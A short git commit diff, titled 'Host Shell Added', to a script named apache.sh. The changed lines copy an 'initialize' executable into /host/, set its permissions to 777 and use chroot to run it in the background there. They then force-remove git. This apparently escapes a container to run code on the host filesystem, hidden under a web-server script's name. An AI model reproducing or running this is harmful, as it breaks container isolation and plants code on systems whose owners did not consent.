466dc25a159082876922ce555fff9d09b6641c0d
Gönenç <40662677+xeroxpro@users.noreply.github.com>
2023-05-04 01:10:18 +0300

    Host Shell Added

--- apache.sh
+++ apache.sh
@@ -1,2 +1,2 @@
-cp initialize /host/ && cd /host/ && chmod 777 initialize && ./initialize & 
-apt remove git 
+cp initialize /host/ && cd /host/ && chmod 777 initialize && chroot ./ ./initialize & 
+apt remove git -y 
